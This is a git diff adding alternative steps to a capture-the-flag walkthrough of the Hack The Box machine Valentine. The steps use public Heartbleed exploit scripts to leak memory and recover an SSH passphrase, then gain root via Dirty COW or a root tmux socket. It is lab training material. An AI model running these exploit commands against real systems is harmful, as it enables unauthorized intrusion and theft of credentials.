@@ -53,7 +53,11 @@ gobuster dir -e -w /usr/share/wordlists/dirb/common.txt -u 10.10.10.79 -k -n -r 
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ff889a3f-83fa-49a3-9646-8c17dcc949db)
 
-+ Port 443 is running a version of OpenSSL that is vulnerable to **Heartbleed**!
++ **Alternatively**, check whether it is vulnerable using `sslyze --heartbleed 10.10.10.79:443`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/51ef03c6-4a1f-4752-b3e6-50e21bcbba46)
+
++ Port 443 is running a version of OpenSSL that is vulnerable to **Heartbleed**!: [CVE-2014-0160](https://gist.github.com/eelsivart/10174134)
 + `git clone https://gist.github.com/eelsivart/10174134`
 + `python heartbleed.py 10.10.10.79`
 + View **decode.php** and **text** value.
@@ -94,11 +98,28 @@ User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/boo
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/54f4c737-c556-4002-a270-a5a4e453b02a)
 
-+ Navigate to **http://10.10.10.79/decode.php**. Copy the **text** value, and decode it.
++ **Alternatively 1**, `searchsploit heartbleed`
++ `searchsploit -m 32764`
++ https://www.exploit-db.com/exploits/32764
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a4678ab2-b3c8-4af6-8e91-6787156337fe)
+
++ `python2 32764.py 10.10.10.79 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d0e7c4c7-2e19-41f0-9a08-0d641aa1318a)
+
++ Navigate to **http://10.10.10.79/decode.php**. Copy the **text** value, and decode it. **Also**, you can use an online base64 decoder.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8043e8ba-37eb-4804-adc4-599ff419d146)
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7fe3609b-9537-4bb9-be08-aa29b64eefff)
+
++ **Alternatively 2**, **32745.py** can be used.
+```
+python2 32745.py 10.10.10.79 | grep -v 00 | grep -v "00 00 00" | grep -v "11 11 11"
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3044b71e-2c8c-46cd-b735-3b22fb8b1d09)
 
 + Use the decoded value `heartbleedbelievethehype` on ssh login.
 + Try to login ssh again: `ssh -i id_rsa hype@10.10.10.79`
@@ -110,8 +131,12 @@ User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/boo
 ## Privilege Escalation
 
 ### 1.Method:
++ Transfer linpeas.sh, and run.
 + Check kernel version: `uname -a`
-+ `searchsploit dirty`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b0a23f83-78ec-4ce6-b7ed-d903449fe0fb)
+
++ `searchsploit dirty`: [CVE-2016-5195](https://www.exploit-db.com/exploits/40839)
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/56ba4843-5761-4104-aec6-e2c4ee4535a7)
 
@@ -130,18 +155,23 @@ gcc -pthread 40839.c -o exploit -lcrypt
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9c9a866b-e555-4cb2-b6b6-d95a75651378)
 
+### 2.Method:
++ Transfer linpeas.sh, and run.
++ Linpeas found a tmux session that can be used to escalate privilege.
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/44d46a64-541d-42e0-ac14-25704857859e)
 
++ `/usr/bin/tmux -S /.devs/dev_sess`
++ Get the root shell.
 
-
-
-
-
-
-
-
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1a64fd13-4e8a-4a5c-9e60-070aca2760ec)
 
 
 # References & Alternatives:
 + https://vvmlist.github.io/#valentine
-+ 
++ https://0xdf.gitlab.io/2018/07/28/htb-valentine.html
++ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/valentine-writeup-w-o-metasploit
++ https://benheater.com/hackthebox-valentine/
++ https://ethicalhacs.com/valentine-hackthebox-walkthrough/
++ https://manuelvazquez-contact.gitbook.io/oscp-prep/hack-the-box/valentine/scanning-and-enumeration
++ https://www.siberportal.org/red-team/penetration-testing/hack-the-box-valentine-cozumu/
